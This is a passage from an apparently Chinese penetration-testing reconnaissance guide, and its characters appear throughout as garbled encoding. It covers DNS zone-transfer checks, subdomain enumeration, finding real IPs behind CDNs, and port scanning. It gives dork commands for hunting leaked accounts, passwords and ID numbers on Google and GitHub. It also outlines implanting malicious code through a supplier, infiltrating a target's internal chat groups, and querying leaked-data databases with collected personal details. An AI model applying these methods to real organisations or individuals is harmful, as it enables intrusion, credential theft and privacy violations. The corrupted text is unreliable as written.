å†—ä½™ï¼Œä¸€æ—¦ä¸»æœåŠ¡å™¨å‡ºç°é—®é¢˜å¯ç›´æ¥è®©å¤‡ä»½æœåŠ¡å™¨åšå¥½æ”¯æ’‘å·¥ä½œã€‚</p></li><li><p>æœ‰ä»€ä¹ˆç”¨</p><p>è‹¥ DNS æœåŠ¡å™¨é…ç½®ä¸å½“ï¼Œå¯èƒ½å¯¼è‡´æ”»å‡»è€…è·å–æŸä¸ªåŸŸçš„æ‰€æœ‰è®°å½•ã€‚é€ æˆæ•´ä¸ªç½‘ç»œçš„æ‹“æ‰‘ç»“æ„æ³„éœ²ç»™æ½œåœ¨çš„æ”»å‡»è€…ã€‚</p></li><li><p>æ£€æµ‹æ–¹æ³•</p><ul><li><p>digè¯·æ±‚</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">æ‰¾åˆ°NSæœåŠ¡å™¨</span></span><br><span class="line">dig [domain] ns</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">å‘é€axfrè¯·æ±‚</span></span><br><span class="line">dig axfr @[ns] [domain]</span><br></pre></td></tr></table></figure></li><li><p>nmapè„šæœ¬</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">--script dns-zone-transfer --script-args dns-zone-transfer.domain=[domain]</span><br></pre></td></tr></table></figure></li></ul></li></ul><h3 id="æœç´¢å¼•æ“"><a href="#æœç´¢å¼•æ“" class="headerlink" title="æœç´¢å¼•æ“"></a>æœç´¢å¼•æ“</h3><ul><li><p>ä¼ ç»Ÿæœç´¢å¼•æ“</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">site: xxx.com -xxx (-xxx æ’é™¤å“ªäº›å­åŸŸ)</span><br></pre></td></tr></table></figure></li><li><p>ç½‘ç»œç©ºé—´æµ‹ç»˜</p></li></ul><h3 id="ç«™ç‚¹çˆ¬è™«"><a href="#ç«™ç‚¹çˆ¬è™«" class="headerlink" title="ç«™ç‚¹çˆ¬è™«"></a>ç«™ç‚¹çˆ¬è™«</h3><p>é€šè¿‡çˆ¬å–ç½‘ç«™ä¸­çš„urlé“¾æ¥æ¥å‘ç°æ–°çš„å­åŸŸå</p><p>oneforallå¾ˆå¤šæ—¶å€™æ²¡æœ‰çˆ¬å–å‡ºæ¥ï¼Œéœ€è¦æ‰‹åŠ¨ç”¨urlfinderæ‰¾ä¸€ä¸‹</p><h3 id="ç«™ç‚¹ä¿¡æ¯æ³„æ¼"><a href="#ç«™ç‚¹ä¿¡æ¯æ³„æ¼" class="headerlink" title="ç«™ç‚¹ä¿¡æ¯æ³„æ¼"></a>ç«™ç‚¹ä¿¡æ¯æ³„æ¼</h3><ul><li>crossdomain.xml</li><li>sitemap.xml</li><li>å“åº”åŒ…ä¸­çš„CSPå…¶ä¸­*-srcå¯èƒ½ä¼šå­˜åœ¨åŸŸåä¿¡æ¯</li></ul><h3 id="ç¬¬ä¸‰æ–¹åœ¨çº¿å¹³å°"><a href="#ç¬¬ä¸‰æ–¹åœ¨çº¿å¹³å°" class="headerlink" title="ç¬¬ä¸‰æ–¹åœ¨çº¿å¹³å°"></a>ç¬¬ä¸‰æ–¹åœ¨çº¿å¹³å°</h3><ul><li><p><a href="https://securitytrails.com(uiå¥½çœ‹,ç»“æœæœ€å¤š)/">https://securitytrails.comï¼ˆUIå¥½çœ‹ï¼Œç»“æœæœ€å¤šï¼‰</a></p></li><li><p><a href="https://dnsdumpster.com/">DNSdumpster.com </a></p></li><li><p><a href="https://rapiddns.io/">https://rapiddns.io/</a></p></li></ul><h3 id="èšåˆå·¥å…·-1"><a href="#èšåˆå·¥å…·-1" class="headerlink" title="èšåˆå·¥å…·"></a>èšåˆå·¥å…·</h3><h4 id="æ”¶é›†å·¥å…·"><a href="#æ”¶é›†å·¥å…·" class="headerlink" title="æ”¶é›†å·¥å…·"></a>æ”¶é›†å·¥å…·</h4><ul><li><p><code>OneForAll</code></p><blockquote><p>ä¸€æ¡é¾™ï¼Œéœ€è¦é…ç½®apiï¼Œé…åˆä»£ç†ä½¿ç”¨æ•ˆæœæ›´ä½³</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python oneforall.py --target domain run</span><br><span class="line">python oneforall.py --targets domain.txt run</span><br></pre></td></tr></table></figure></li><li><p>æ°´æ³½</p></li></ul><h4 id="æ¢æ´»å·¥å…·"><a href="#æ¢æ´»å·¥å…·" class="headerlink" title="æ¢æ´»å·¥å…·"></a>æ¢æ´»å·¥å…·</h4><ul><li><code>httpx</code></li></ul><h2 id="IPæ®µä¿¡æ¯æ”¶é›†"><a href="#IPæ®µä¿¡æ¯æ”¶é›†" class="headerlink" title="IPæ®µä¿¡æ¯æ”¶é›†"></a>IPæ®µä¿¡æ¯æ”¶é›†</h2><h3 id="CDN"><a href="#CDN" class="headerlink" title="CDN"></a>CDN</h3><p>From[BYPASS-CDN&#x2F;CDN 2023 å®Œå…¨æ”»å‡»æŒ‡å—ï¼ˆä¸€ï¼‰.md at main Â· bin-maker&#x2F;BYPASS-CDN Â· GitHub](<a href="https://github.com/bin-maker/BYPASS-CDN/blob/main/CDN">https://github.com/bin-maker/BYPASS-CDN/blob/main/CDN</a> 2023 å®Œå…¨æ”»å‡»æŒ‡å—ï¼ˆä¸€ï¼‰.md)</p><h4 id="æ˜¯ä»€ä¹ˆ"><a href="#æ˜¯ä»€ä¹ˆ" class="headerlink" title="æ˜¯ä»€ä¹ˆ"></a>æ˜¯ä»€ä¹ˆ</h4><p>CDNï¼ˆContent Delivery Networkï¼‰ï¼Œä¸­æ–‡å…¨ç§°ä¸ºå†…å®¹åˆ†å‘ç½‘ç»œã€‚</p><p>ç®€å•çš„è¯´å°±æ˜¯ä¸€ç»„åœ¨ä¸åŒè¿è¥å•†ä¹‹é—´çš„å¯¹æ¥ç‚¹ä¸Šçš„é«˜é€Ÿç¼“å­˜æœåŠ¡å™¨ï¼ŒæŠŠç”¨æˆ·ç»å¸¸è®¿é—®çš„<strong>é™æ€æ•°æ®</strong>èµ„æºç›´æ¥<strong>ç¼“å­˜</strong>åˆ°èŠ‚ç‚¹æœåŠ¡å™¨ä¸Šï¼Œå½“ç”¨æˆ·å†æ¬¡è¯·æ±‚æ—¶ï¼Œä¼šç›´æ¥åˆ†å‘åˆ°ç¦»ç”¨æˆ·è¿‘çš„èŠ‚ç‚¹æœåŠ¡å™¨ä¸Šå“åº”ç»™ç”¨æˆ·ï¼Œå½“ç”¨æˆ·<strong>æœ‰å®é™…æ•°æ®äº¤äº’æ—¶</strong>æ‰ä¼š<strong>ä»è¿œç¨‹WebæœåŠ¡å™¨ä¸Šå“åº”</strong>ï¼Œè¿™æ ·å¯ä»¥å¤§å¤§æé«˜ç½‘ç«™çš„å“åº”é€Ÿåº¦åŠç”¨æˆ·ä½“éªŒã€‚</p><h4 id="ä¸ºä»€ä¹ˆ-1"><a href="#ä¸ºä»€ä¹ˆ-1" class="headerlink" title="ä¸ºä»€ä¹ˆ"></a>ä¸ºä»€ä¹ˆ</h4><ul><li>ç»•è¿‡å¯»æ‰¾çœŸå®IP</li><li>ç»•è¿‡äº‘Waf</li></ul><h4 id="åˆ¤æ–­CDN"><a href="#åˆ¤æ–­CDN" class="headerlink" title="åˆ¤æ–­CDN"></a>åˆ¤æ–­CDN</h4><ul><li><p>åæŸ¥åŸŸå IPï¼Œçœ‹ç»“æœæ˜¯å¦æœ‰å¤§é‡ä¸ç›¸å…³çš„åŸŸåå­˜åœ¨</p></li><li><p>è§‚å¯Ÿè¯·æ±‚å“åº”çš„è¿”å›æ•°æ®çš„å¤´éƒ¨ï¼Œæ˜¯å¦æœ‰ CDN æœåŠ¡å•†æ ‡è¯†</p></li><li><p>é€šè¿‡ä¸åŒå®šä½åœ°ç‚¹çš„ ping æµ‹è¯•ï¼Œå¦‚æœæ²¡æœ‰ä½¿ç”¨CDNï¼Œåˆ™åªä¼šæ˜¾ç¤ºä¸€ä¸ªIPåœ°å€ã€‚</p><ul><li><a href="http://www.webkaka.com/Ping.aspx">http://www.webkaka.com/Ping.aspx</a>ï¼ˆå›½å†…+å›½å¤–ï¼‰</li><li><a href="https://www.host-tracker.com/v3/check/">https://www.host-tracker.com/v3/check/</a>  ï¼ˆå›½å¤–ï¼‰</li></ul></li><li><p>åˆ¤æ–­ IP æ˜¯å¦åœ¨å¸¸è§ CDN æœåŠ¡å•†çš„æœåŠ¡å™¨ IP æ®µä¸Š</p></li><li><p>è‹¥ asp æˆ–è€… asp.net ç½‘ç«™è¿”å›å¤´çš„ server ä¸æ˜¯ IISã€è€Œæ˜¯ Nginxï¼Œåˆ™å¤šåŠä½¿ç”¨äº†nginxåå‘ä»£ç†åˆ° CDN</p></li><li><p>åˆ©ç”¨ Nslookup æŸ¥è¯¢åŸŸå</p><ul><li><p>æœåŠ¡å™¨åç§°</p><p><img src="/../images/image-20230509225424444-1685533751888.png" alt="image-20230509225424444"></p></li><li><p>åŒä¸€ä¸ªåŸŸåè§£æå¯¹åº”å¤šä¸ª IP åœ°å€</p><p><img src="/../images/image-20230509225313449-1685533751888.png" alt="image-20230509225313449"></p></li></ul></li></ul><h4 id="CDNç»•è¿‡æ–¹æ³•"><a href="#CDNç»•è¿‡æ–¹æ³•" class="headerlink" title="CDNç»•è¿‡æ–¹æ³•"></a>CDNç»•è¿‡æ–¹æ³•</h4><h5 id="CDNè´¹ç”¨"><a href="#CDNè´¹ç”¨" class="headerlink" title="CDNè´¹ç”¨"></a>CDNè´¹ç”¨</h5><p>CDN åŠ é€Ÿéœ€è¦æ”¯ä»˜ä¸€å®šçš„è´¹ç”¨ï¼Œæ‰€ä»¥<strong>å­ç«™ï¼Œå›½å¤–</strong>å¾ˆå¯èƒ½æ²¡æœ‰éƒ¨ç½²CDNã€‚</p><h5 id="å†å²-DNS-è®°å½•"><a href="#å†å²-DNS-è®°å½•" class="headerlink" title="å†å² DNS è®°å½•"></a>å†å² DNS è®°å½•</h5><p><a href="https://viewdns.info/iphistory/?domain=www.baidu.com">IP History - ViewDNS.info</a></p><p><a href="https://x.threatbook.com/v5/domain/www.baidu.com?source=top">å¾®æ­¥åœ¨çº¿Xæƒ…æŠ¥ç¤¾åŒº-å¨èƒæƒ…æŠ¥æŸ¥è¯¢_å¨èƒåˆ†æå¹³å°_å¼€æ”¾ç¤¾åŒº</a></p><h5 id="é‚®ç®±"><a href="#é‚®ç®±" class="headerlink" title="é‚®ç®±"></a>é‚®ç®±</h5><blockquote><p>ç”¨ç›®æ ‡é‚®ä»¶æœåŠ¡å™¨å‘é€é‚®ä»¶ç»™è‡ªå·±(QQé‚®ç®±)å†æŸ¥çœ‹é‚®ä»¶æºç ä¸€å®šæƒ…å†µä¸‹å¯ä»¥æ‰¾åˆ°çœŸå®IPï¼ˆæœåŠ¡ç«¯å’Œæˆ‘ä»¬å»ºç«‹è¿æ¥ï¼‰</p><p>è¿™é‡Œè¿˜æœ‰ä¸€ä¸ª<code>å¥‡æ·«æŠ€å·§</code>ï¼Œé€šè¿‡å‘é€é‚®ä»¶ç»™ä¸€ä¸ªä¸å­˜åœ¨çš„é‚®ç®±åœ°å€ï¼Œæ¯”å¦‚ <a href="mailto:000xxx@domain.com">000xxx@domain.com</a> ï¼Œå› ä¸ºè¯¥ç”¨æˆ·ä¸å­˜åœ¨ï¼Œæ‰€ä»¥å‘é€å°†å¤±è´¥ï¼Œå¹¶ä¸”è¿˜ä¼šæ”¶åˆ°ä¸€ä¸ªåŒ…å«å‘é€è¯¥ç”µå­é‚®ä»¶ç»™ä½ çš„æœåŠ¡å™¨çš„çœŸå® IP é€šçŸ¥ã€‚</p></blockquote><ul><li>RSS è®¢é˜…</li><li>é‚®ç®±æ³¨å†Œã€æ¿€æ´»å¤„</li><li>é‚®ç®±æ‰¾å›å¯†ç å¤„</li><li>äº§å“æ›´æ–°çš„é‚®ä»¶æ¨é€</li><li>æŸä¸šåŠ¡æ‰§è¡Œåå‘é€çš„é‚®ä»¶é€šçŸ¥</li><li>å‘˜å·¥é‚®ç®±ã€é‚®ä»¶ç®¡ç†å¹³å°ç­‰å…¥å£å¤„çš„å¿˜è®°å¯†ç </li></ul><h5 id="virtual-host-ç¢°æ’"><a href="#virtual-host-ç¢°æ’" class="headerlink" title="virtual-host ç¢°æ’"></a>virtual-host ç¢°æ’</h5><p>åŸç†ï¼š<a href="https://mp.weixin.qq.com/s/o8uAPbw7OSdFhHKOpOYKvg">https://mp.weixin.qq.com/s/o8uAPbw7OSdFhHKOpOYKvg</a></p><ul><li>å½“æˆ‘ä»¬æ”¶é›†äº†ç›®æ ‡è¶³å¤Ÿå¤šçš„å¯èƒ½çš„çœŸå® IP æ—¶ï¼Œå¯ä»¥é€šè¿‡ IP å’Œå­åŸŸçš„ç¢°æ’ï¼Œæ¥æ‰¹é‡è·å¾—å‘½ä¸­ç›®æ ‡ä»¥åŠç›®æ ‡å“ªäº›çš„å­åŸŸã€‚</li><li>åœ¨çº¿æ”¶é›†å·¥å…· <a href="https://pentest-tools.com/information-gathering/find-virtual-hosts">https://pentest-tools.com/information-gathering/find-virtual-hosts</a></li></ul><h5 id="ç©ºé—´æµ‹ç»˜å¼•æ“"><a href="#ç©ºé—´æµ‹ç»˜å¼•æ“" class="headerlink" title="ç©ºé—´æµ‹ç»˜å¼•æ“"></a>ç©ºé—´æµ‹ç»˜å¼•æ“</h5><ul><li><p>favicon.ico å“ˆå¸Œç‰¹å¾</p></li><li><p>ç½‘é¡µæºç ç‰¹å¾å€¼</p><blockquote><p>åœ¨æœåŠ¡å™¨æº IP åœ°å€å…è®¸è®¿é—®å¹¶ä¸”è¿”å›çš„ä¹Ÿæ˜¯ç±»ä¼¼çš„ç½‘ç«™å†…å®¹æƒ…å†µä¸‹ï¼Œå¯ä»¥é€šè¿‡ä¾¦å¯Ÿé¡µé¢æºç ä¸­ JS ã€CSS ã€HTML ç­‰ä¸€ç³»åˆ—é™æ€ç‰¹å¾å€¼ï¼Œç„¶åç”¨ Shodan ã€Zoomeye ã€Censys ç­‰æœç´¢å¼•æ“è¿›è¡ŒåŒ¹é…æœç´¢ï¼Œä»è€Œå®šä½ IP ã€‚</p></blockquote></li></ul><h4 id="çœŸå®-IP-ä½¿ç”¨"><a href="#çœŸå®-IP-ä½¿ç”¨" class="headerlink" title="çœŸå® IP ä½¿ç”¨"></a>çœŸå® IP ä½¿ç”¨</h4><p>åœ¨è·å–åˆ°çœŸå®IPåï¼Œé€šè¿‡ç›´æ¥è®¿é—®IPå¯èƒ½æ— æ³•è®¿é—®</p><ul><li><p>ä¿®æ”¹ hosts æ–‡ä»¶</p></li><li><p>burpsuite æµ‹è¯•</p><p><img src="/../images/image-20230510181257028-1685533751888.png" alt="image-20230510181257028"></p></li></ul><h4 id="å·¥å…·"><a href="#å·¥å…·" class="headerlink" title="å·¥å…·"></a>å·¥å…·</h4><p>FCDN</p><h3 id="Cæ®µåŠç«¯å£æ‰«æ"><a href="#Cæ®µåŠç«¯å£æ‰«æ" class="headerlink" title="Cæ®µåŠç«¯å£æ‰«æ"></a>Cæ®µåŠç«¯å£æ‰«æ</h3><h4 id="å·¥å…·-1"><a href="#å·¥å…·-1" class="headerlink" title="å·¥å…·"></a>å·¥å…·</h4><ul><li><p>nmap</p><p>ç»å…¸å·¥å…·ï¼Œå”¯ä¸€ç¼ºç‚¹å°±æ˜¯æ…¢</p></li><li><p>masscan</p><p>å¿«ï¼Œåªèƒ½æ‰«ipï¼Œå¯ä»¥å¯¼å‡ºç»“æœè”åŠ¨nmap</p></li><li><p>rustscan</p><p>æœ€å¿«ï¼Œå¹¶ä¸”å¯ä»¥ç›´æ¥è”åŠ¨nmapï¼Œä½†æ˜¯æ„Ÿè§‰ä¸æ˜¯ç‰¹åˆ«å‡†ç¡®</p></li><li><p>goby</p><p>æ…¢ï¼Œæœ‰æŒ‡çº¹è¯†åˆ«</p></li></ul><h4 id="å¸¸è§ç«¯å£åˆ©ç”¨"><a href="#å¸¸è§ç«¯å£åˆ©ç”¨" class="headerlink" title="å¸¸è§ç«¯å£åˆ©ç”¨"></a>å¸¸è§ç«¯å£åˆ©ç”¨</h4><p><a href="https://fgtbnc.github.io/2023/05/02/%E7%AB%AF%E5%8F%A3%E6%B8%97%E9%80%8F/">ç«¯å£æ¸—é€ | Khazâ€™s Blog (fgtbnc.github.io)</a></p><h2 id="æ–°å¼€çš„ä¸šåŠ¡"><a href="#æ–°å¼€çš„ä¸šåŠ¡" class="headerlink" title="æ–°å¼€çš„ä¸šåŠ¡"></a>æ–°å¼€çš„ä¸šåŠ¡</h2><p>å¯¹åº”æ–°é—»ï¼Œå…¬ä¼—å·èµ„è®¯ç­‰ç­‰</p><h1 id="æ•æ„Ÿä¿¡æ¯æ”¶é›†"><a href="#æ•æ„Ÿä¿¡æ¯æ”¶é›†" class="headerlink" title="æ•æ„Ÿä¿¡æ¯æ”¶é›†"></a>æ•æ„Ÿä¿¡æ¯æ”¶é›†</h1><h2 id="ä¸ºä»€ä¹ˆ-2"><a href="#ä¸ºä»€ä¹ˆ-2" class="headerlink" title="ä¸ºä»€ä¹ˆ"></a>ä¸ºä»€ä¹ˆ</h2><ul><li>è¿æ°”å¥½ï¼Œä¸€æ­¥åˆ°ä½</li><li>è¿›ä¸€æ­¥äº†è§£ç›®æ ‡</li><li>åˆ¶ä½œæœ‰é’ˆå¯¹æ€§çš„å¼±å£ä»¤å­—å…¸</li><li>ğŸ£</li></ul><h2 id="ä¾›åº”é“¾å…¬å¸"><a href="#ä¾›åº”é“¾å…¬å¸" class="headerlink" title="ä¾›åº”é“¾å…¬å¸"></a>ä¾›åº”é“¾å…¬å¸</h2><p><a href="https://xz.aliyun.com/t/10531">è®°ä¸€æ¬¡é€šè¿‡ä¾›åº”é“¾æ‹¿åˆ°ç›®æ ‡åå°æƒé™çš„è¿‡ç¨‹ - å…ˆçŸ¥ç¤¾åŒº</a></p><p><a href="https://mp.weixin.qq.com/s/IgmxbD-1y08w5gd7gVOmSg">çº¢è“å¯¹æŠ—]-ä»ä¾›åº”å•†åˆ°é¶æ ‡ (qq.com)</a></p><p>ç¾å›½APTæ‰“ä¼Šæœ—</p><ul><li><p>ä¸ºä»€ä¹ˆ</p><p>è¯•æƒ³ä¸€ä¸‹ï¼Œç›®æ ‡ä½¿ç”¨ä¾›åº”å•†æä¾›çš„è½¯ä»¶ï¼Œé‚£ä¹ˆè¿™äº›è½¯ä»¶æ˜¯å—åˆ°ä¿¡ä»»çš„ã€‚</p><p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡æ”»å‡»ä¾›åº”å•†ï¼Œå¹¶åœ¨è½¯ä»¶ä¸­æ¤å…¥æ¶æ„ä»£ç ï¼Œè¿™æ ·ç›®æ ‡åœ¨è¿è¡Œè½¯ä»¶æ—¶ä¹Ÿä¼šè¿è¡Œæ¶æ„ä»£ç ï¼Œä»è€Œè¾¾åˆ°æ”»å‡»ã€‚å¹¶ä¸”ä¾›åº”å•†ä¿å­˜äº†ç›®æ ‡çš„å„ç§ä¿¡æ¯ã€‚</p></li><li><p>æ‰‹æ®µ</p><ul><li>ç½‘ç«™é¡µåº•çš„å¤‡æ¡ˆï¼Œç‰ˆæƒä¿¡æ¯<img src="/../images/image-20230511130314346-1685533751887.png" alt="image-20230511130314346"></li><li>æ‹›æ ‡æ–‡ä»¶</li></ul></li></ul><h2 id="æœç´¢å¼•æ“-1"><a href="#æœç´¢å¼•æ“-1" class="headerlink" title="æœç´¢å¼•æ“"></a>æœç´¢å¼•æ“</h2><ul><li><p>é’ˆå¯¹ä¿¡æ¯æ³„éœ²çš„åœ¨çº¿ç½‘ç«™</p><ul><li><p><a href="https://leakix.net/">LeakIX</a></p></li><li><p><a href="https://intelx.io/">https://intelx.io/</a></p></li><li><p><a href="https://haveibeenpwned.com/">https://haveibeenpwned.com/</a></p></li><li><p><a href="https://aleph.occrp.org/">https://aleph.occrp.org/</a></p></li><li><p><a href="https://dehashed.com/">https://dehashed.com/</a></p></li></ul></li><li><p><code>Google Hacking</code></p><ul><li><p>å¸¸ç”¨è¯­æ³•</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">site:target.com  è´¦å· | å¯†ç  | å·¥å· | å­¦å· | èº«ä»½è¯ | å…¬ç¤º | é‚®ç®±</span><br></pre></td></tr></table></figure></li><li><p>å·¥å…·</p><p><a href="https://github.com/dwisiswant0/go-dork">https://github.com/dwisiswant0/go-dork</a></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">.\go-dork.exe -q &quot;[è¯­æ³•]&quot; -p [é¡µé¢æ•°é‡] -x http://127.0.0.1:33210 </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">ä¸€é¡µ10ä¸ªæ•°æ®</span></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">-e æŒ‡å®šå¼•æ“ æµ‹è¯•äº†åªæœ‰googleå¯ä»¥</span><br><span class="line">Google, Shodan, Bing, Duck, Yahoo, Ask</span><br></pre></td></tr></table></figure><p>â€‹<img src="/../images/image-20230510222146978-1685533751888.png" alt="image-20230510222146978"></p></li></ul></li></ul><p>â€‹</p><ul><li><p>ç½‘ç«™</p><p><a href="https://ght.se7ensec.cn/#">åœ¨çº¿Google Hackingå°å·¥å…·</a></p><p><img src="/../images/image-20230509215656848-1685533751889.png" alt="image-20230509215656848"></p><p><a href="https://www.exploit-db.com/google-hacking-database">Google Hacking Database (GHDB) - Google Dorks, OSINT, Recon</a></p><p><img src="/../images/image-20230509151606375-1685533751889.png" alt="image-20230509151606375"></p></li></ul><h2 id="ç›®å½•-x2F-æ–‡ä»¶æ‰«æ"><a href="#ç›®å½•-x2F-æ–‡ä»¶æ‰«æ" class="headerlink" title="ç›®å½•&#x2F;æ–‡ä»¶æ‰«æ"></a>ç›®å½•&#x2F;æ–‡ä»¶æ‰«æ</h2><p><strong>å…³é”®æ˜¯å­—å…¸ï¼Œéœ€è¦ç§¯ç´¯å­—å…¸</strong></p><ul><li><p>å·¥å…·ï¼šdirsearch</p></li><li><p>å­—å…¸</p><p>å°†å·¥å…·å†…ç½®å­—å…¸å’Œå…¬å¼€å­—å…¸è¿›è¡Œæ•´åˆï¼Œç„¶åè‡ªå·±åœ¨å®é™…ä¸­é‡åˆ°çš„å†æ·»åŠ ã€‚</p></li><li><p>æ³¨æ„ç‚¹</p><p>403&#x2F;404çŠ¶æ€ç ï¼Œå¯ä»¥è¿›è¡Œé€çº§ç›®å½•æ‰«æ</p><p>æ‰«IPå’Œæ‰«åŸŸåæ˜¯ä¸ä¸€æ ·çš„ï¼Œå› ä¸ºä¸€ä¸ªipå¯èƒ½æœ‰å¤šä¸ªåŸŸå</p></li></ul><h2 id="JSä¸­çš„ä¿¡æ¯"><a href="#JSä¸­çš„ä¿¡æ¯" class="headerlink" title="JSä¸­çš„ä¿¡æ¯"></a>JSä¸­çš„ä¿¡æ¯</h2><p>å¯èƒ½æ³„éœ²æ¥å£ï¼Œåå°åœ°å€ï¼Œå¯†ç ç­‰æ•æ„Ÿä¿¡æ¯</p><ul><li><p>å·¥å…·</p><p><code>Urlfinder</code>  ï¼ˆæ¨èï¼‰</p></li><li><p>æµè§ˆå™¨æ’ä»¶</p><p>Superesearch</p><p>ç”¨å·¥å…·æ‰¾åˆ°çš„è·¯å¾„éœ€è¦éªŒæ´»ï¼Œæœ‰æ—¶å€™è¿˜éœ€è¦æ‹¼æ¥ä¸€çº§è·¯ç”±æ‰å¯ä»¥ï¼ˆä¸€çº§è·¯ç”±ç­‰å¯ä»¥é€šè¿‡æŠ“åŒ…åˆ†æå¾—åˆ°ï¼‰ã€‚</p></li></ul><h2 id="ä»£ç æ‰˜ç®¡å¹³å°"><a href="#ä»£ç æ‰˜ç®¡å¹³å°" class="headerlink" title="ä»£ç æ‰˜ç®¡å¹³å°"></a>ä»£ç æ‰˜ç®¡å¹³å°</h2><ul><li><p>github</p><p>å·¥å…·</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/damit5/gitdorks_go</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./gitdorks_go_amd_linux -gd Dorks/smalldorks.txt -nws 20 -target gm7.org -tf tokenFile/tf.txt -ew 3</span><br></pre></td></tr></table></figure><blockquote><p><code>./tokenFile/tf.txt</code> â†’ <code>Github access token</code></p><p><code>../Dorks/smalldorks.txt</code> â†’  <code>å…³é”®å­—å­—å…¸</code></p></blockquote></li><li><p>GitLab: <a href="https://about.gitlab.com/">https://about.gitlab.com/</a></p></li><li><p>gitee: <a href="https://gitee.com/">https://gitee.com/</a></p></li></ul><h2 id="æ‹›è˜ä¿¡æ¯"><a href="#æ‹›è˜ä¿¡æ¯" class="headerlink" title="æ‹›è˜ä¿¡æ¯"></a>æ‹›è˜ä¿¡æ¯</h2><p>å¯ä»¥é€šè¿‡è¯¥å…¬å¸çš„æ‹›è˜å²—ä½ä¿¡æ¯ï¼Œåˆ†æå…¶æŠ€æœ¯æ ˆï¼Œå¾—åˆ°å¯¹æ–¹ç½‘ç«™çš„æ¶æ„ã€‚</p><h2 id="ç½‘ç›˜ä¿¡æ¯"><a href="#ç½‘ç›˜ä¿¡æ¯" class="headerlink" title="ç½‘ç›˜ä¿¡æ¯"></a>ç½‘ç›˜ä¿¡æ¯</h2><p>èšåˆç½‘ç«™ï¼š<a href="https://www.chaonengsou.com/">è¶…èƒ½æœ - ç™¾åº¦ç½‘ç›˜æœç´¢ç¥å™¨</a></p><h2 id="å†å²æ¼æ´"><a href="#å†å²æ¼æ´" class="headerlink" title="å†å²æ¼æ´"></a>å†å²æ¼æ´</h2><blockquote><p>ä»å„ç¬¬ä¸‰æ–¹å†å²æ¼æ´åº“ä¸­æŸ¥æ‰¾ç›®æ ‡æ›¾ç»æ³„éœ²çš„ å„ç§æ•æ„Ÿè´¦å·å¯†ç  [ å›½å†…ç›®æ ‡å¾ˆå¥½ä½¿ï¼Ÿ ]</p></blockquote><p><a href="https://www.cnvd.org.cn/">å›½å®¶ä¿¡æ¯å®‰å…¨æ¼æ´å…±äº«å¹³å°</a></p><p><a href="https://src.sjtu.edu.cn/">ä¸»é¡µ | æ•™è‚²æ¼æ´æŠ¥å‘Šå¹³å°</a></p><h2 id="æŠ€æœ¯æ–‡æ¡£-x2F-wiki-x2F-çŸ¥è¯†åº“"><a href="#æŠ€æœ¯æ–‡æ¡£-x2F-wiki-x2F-çŸ¥è¯†åº“" class="headerlink" title="æŠ€æœ¯æ–‡æ¡£ &#x2F; wiki &#x2F;çŸ¥è¯†åº“"></a>æŠ€æœ¯æ–‡æ¡£ &#x2F; wiki &#x2F;çŸ¥è¯†åº“</h2><p>ç›®æ ‡è‡ªå·±å¯¹å¤–æä¾›çš„å„ç§æ–‡æ¡£é‡Œæ³„éœ²çš„å„ç§è´¦å·å¯†ç åŠå…¶å®ƒæ•æ„Ÿä¿¡æ¯</p><ul><li><p>å®˜ç½‘</p></li><li><p><a href="https://www.yuque.com/dashboard">å·¥ä½œå° Â· è¯­é›€</a></p></li><li><p>ç™¾åº¦æ–‡åº“ï¼š<a href="https://wenku.baidu.com/">https://wenku.baidu.com</a></p><p>åŸåˆ›åŠ›æ–‡æ¡£ï¼š<a href="https://max.book118.com/">https://max.book118.com</a></p><p>å‡Œé£äº‘ï¼š<a href="https://wenku.lingfengyun.com/">https://wenku.lingfengyun.com</a></p></li></ul><h2 id="æŠ¥é”™ä¿¡æ¯"><a href="#æŠ¥é”™ä¿¡æ¯" class="headerlink" title="æŠ¥é”™ä¿¡æ¯"></a>æŠ¥é”™ä¿¡æ¯</h2><p>æŠ¥é”™ä¿¡æ¯ä¸­é€šå¸¸æœ‰webæœåŠ¡å™¨çš„å„ç§ä¿¡æ¯ï¼Œå¦‚ç‰©ç†è·¯å¾„ï¼Œç»„ä»¶ä¿¡æ¯ï¼Œä¸»æœºç³»ç»Ÿç­‰</p><h2 id="è§†é¢‘å¹³å°"><a href="#è§†é¢‘å¹³å°" class="headerlink" title="è§†é¢‘å¹³å°"></a>è§†é¢‘å¹³å°</h2><p>æœç´¢æ•™ç¨‹ç±»è§†é¢‘ï¼Œæ¯”å¦‚åå°ç™»é™†ç­‰</p><h2 id="ç¤¾å·¥"><a href="#ç¤¾å·¥" class="headerlink" title="ç¤¾å·¥"></a>ç¤¾å·¥</h2><h3 id="æ‰“å…¥ç›®æ ‡å†…éƒ¨"><a href="#æ‰“å…¥ç›®æ ‡å†…éƒ¨" class="headerlink" title="æ‰“å…¥ç›®æ ‡å†…éƒ¨"></a>æ‰“å…¥ç›®æ ‡å†…éƒ¨</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">åŠ å…¥å†…éƒ¨QQç¾¤ / å¾®ä¿¡ç¾¤ / é’‰é’‰ç¾¤ ç­‰</span><br><span class="line">ç¤¾å·¥å†…éƒ¨äººå‘˜</span><br><span class="line">è¿‘æºæ¸—é€</span><br></pre></td></tr></table></figure><h3 id="ä¸ªäººä¿¡æ¯ä½¿ç”¨"><a href="#ä¸ªäººä¿¡æ¯ä½¿ç”¨" class="headerlink" title="ä¸ªäººä¿¡æ¯ä½¿ç”¨"></a>ä¸ªäººä¿¡æ¯ä½¿ç”¨</h3><ul><li><p>å°†å‰é¢æ”¶é›†åˆ°çš„å§“åï¼Œé‚®ç®±ï¼Œæ‰‹æœºå·ç­‰ä¸ªäººä¿¡æ¯æ”¾å…¥ç¤¾å·¥åº“æŸ¥è¯¢</p></li><li><p><a 